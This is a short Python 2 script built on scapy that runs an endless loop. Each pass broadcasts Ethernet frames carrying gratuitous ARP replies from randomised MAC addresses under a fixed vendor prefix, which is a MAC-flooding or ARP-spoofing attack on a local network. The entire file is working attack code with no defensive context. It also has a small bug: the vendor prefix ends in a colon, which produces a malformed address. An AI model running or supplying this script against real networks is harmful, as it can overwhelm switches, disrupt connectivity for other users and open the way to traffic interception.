#!/usr/bin/env python
from scapy.all import *

vendor = "8b:8c:a8:"
destMAC = "FF:FF:FF:FF:FF:FF"
count = 0
i = 0
while 1 < 100000:
	randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
	print randMAC + ' Attempt ' + str(count);
	sendp(Ether(src=randMAC ,dst=destMAC)/
	ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/Padding(load="X"*18),verbose=0)
	i += 1
	count += 4